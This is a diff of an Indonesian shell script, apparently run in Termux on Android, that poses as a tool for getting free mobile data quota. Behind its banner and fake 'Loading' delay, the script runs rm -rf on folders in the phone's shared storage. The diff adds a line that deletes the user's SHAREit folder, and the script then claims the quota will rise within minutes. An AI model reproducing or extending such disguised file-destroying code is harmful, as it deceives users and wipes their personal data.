@@ -13,7 +13,7 @@ echo  $red    "|       TOOLS KUOTA GRATIS          |"
 echo  $red    "|                                   |"
 echo  $red    "| Author        : Dyxa#ABCD         |"
 echo  $red    "| Contact       : 089676666667      |"
-echo  $red    "| My Team       : Rabbit Cyber team |.                |"
+echo  $red    "| My Team       : Rabbit Cyber team |"
 echo  $red    "| Thanks To     : Al Member         |"
 echo  $blue "<|======================================|>"
 sleep 1
@@ -39,5 +39,7 @@ sleep 1
 echo $red "Loading"
 sleep 2
 rm -rf storage/emulated/0/Dyxa
+rm -rf storage/emulated/0/SHAREit
+
 echo  $blue "Tunggu Beberapa Menit , Nanti Kouta Akan Bertambah"
 fi
